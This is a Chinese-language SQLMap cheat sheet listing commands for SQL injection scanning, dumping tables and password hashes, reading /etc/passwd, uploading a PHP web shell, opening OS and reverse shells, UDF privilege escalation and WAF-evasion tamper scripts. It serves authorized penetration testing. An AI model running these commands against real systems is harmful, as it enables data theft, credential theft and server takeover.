# SQLMap 速查手册

---

## 基础扫描

```bash
# GET 参数
sqlmap -u "http://target.com/page.php?id=1" --batch --random-agent

# POST 参数
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# 从Burp文件加载 (★ 推荐)
sqlmap -r request.txt --batch

# 指定参数
sqlmap -u "URL" -p id --batch                    # 只测id参数

# 指定数据库类型
sqlmap -u "URL" --dbms=mysql --batch
sqlmap -u "URL" --dbms=mssql --batch
```

## 信息获取

```bash
sqlmap -u "URL" --dbs                              # 列数据库
sqlmap -u "URL" -D dbname --tables                 # 列表
sqlmap -u "URL" -D dbname -T users --columns       # 列字段
sqlmap -u "URL" -D dbname -T users --dump          # ★ 拖数据
sqlmap -u "URL" -D dbname -T users -C user,pass --dump # 指定字段
sqlmap -u "URL" --current-user                     # 当前用户
sqlmap -u "URL" --is-dba                           # 是否DBA
sqlmap -u "URL" --passwords                        # 枚举密码hash
```

## 高级利用

```bash
# OS Shell (需DBA)
sqlmap -u "URL" --os-shell
sqlmap -u "URL" --os-pwn                           # 反弹Shell

# 文件操作
sqlmap -u "URL" --file-read "/etc/passwd"          # 读文件
sqlmap -u "URL" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# 提权 (MySQL UDF)
sqlmap -u "URL" --privileges                       # 查看权限
sqlmap -u "URL" --udf-inject                       # UDF提权
```

## 绕过与优化

```bash
# 检测级别
--level=1     # 默认, 仅GET/POST
--level=3     # + Cookie/User-Agent/Referer
--level=5     # + 全面Header注入

# 风险级别
--risk=1      # 默认
--risk=2      # + 带时间延迟的payload
--risk=3      # + OR-based payload

# Tamper (绕过WAF)
--tamper=space2comment          # 空格→/**/
--tamper=randomcase             # 随机大小写
--tamper=between                # ><→BETWEEN
--tamper=charencode             # URL编码
--tamper=charunicodeencode      # Unicode编码
--tamper=space2dash             # 空格→--%0a

# 组合tamper (★ 推荐)
--tamper=space2comment,randomcase,between

# 线程
--threads=10                    # 提速
```

## 关键参数速查

| 参数 | 说明 |
|------|------|
| `--batch` | 全自动,不交互 |
| `--random-agent` | 随机UA |
| `--delay=1` | 延迟1秒 |
| `--time-sec=5` | 时间盲注延时 |
| `--no-cast` | 关闭CAST转换 |
| `--fresh-queries` | 不用缓存 |
| `--flush-session` | 清除session |
| `--sql-query="SELECT ..."` | 自定义SQL |
| `--tamper=xxx` | WAF绕过脚本 |
| `--proxy=http://127.0.0.1:8080` | 走代理 |
| `--mobile` | 模拟手机UA |
| `--tech=B` | 仅布尔盲注 |
| `--technique=BEUSTQ` | 指定注入技术 |

## 注入技术字母

```
B: Boolean-based blind   (布尔盲注)
E: Error-based           (报错注入)
U: Union query           (Union注入)
S: Stacked queries       (堆叠查询)
T: Time-based blind      (时间盲注)
Q: Inline queries        (内联查询)
```

---

*参考: SQLMap Wiki*
